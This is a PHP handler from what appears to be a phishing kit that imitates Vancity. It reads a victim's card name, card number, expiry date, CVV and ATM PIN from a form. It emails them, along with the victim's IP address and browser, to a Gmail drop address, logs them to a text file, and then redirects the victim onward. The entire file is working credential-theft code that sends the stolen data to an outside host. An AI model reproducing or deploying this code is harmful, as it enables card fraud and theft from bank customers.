<?
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------3 CardDetails--------------------\n";
$message .= "NAMEONCARD	: ".$_POST['NC']."\n";
$message .= "CARDNO		: ".$_POST['CN']."\n";
$message .= "EXP		: ".$_POST['ED']."\n";
$message .= "CVV		: ".$_POST['CV']."\n";
$message .= "ATMPIN		: ".$_POST['AP']."\n";
$message .= "-----------------created by codex.v5--------------\n";
$message .= "IP          : ".$ip."\n";$IP=$_POST['IP'];
$message .= "BROWSER     : ".$browser."\n";$browser=$_POST['browser'];
$message .= "-----------------VANCITYResults-------------------\n";
$send = "all.results13@gmail.com";
$subject = "VANCITYResults 2 ".$_POST['results'];
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message);
}
$fp = fopen('VANCITYResults.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>

    window.top.location.href = "../../../../../directing.html?x=v41hQdvgnsk282sMc229rnry4LC3MmFe0-Sd3wXL2SvAdTqzcuyYzw&wicketApp=legacy";
</script>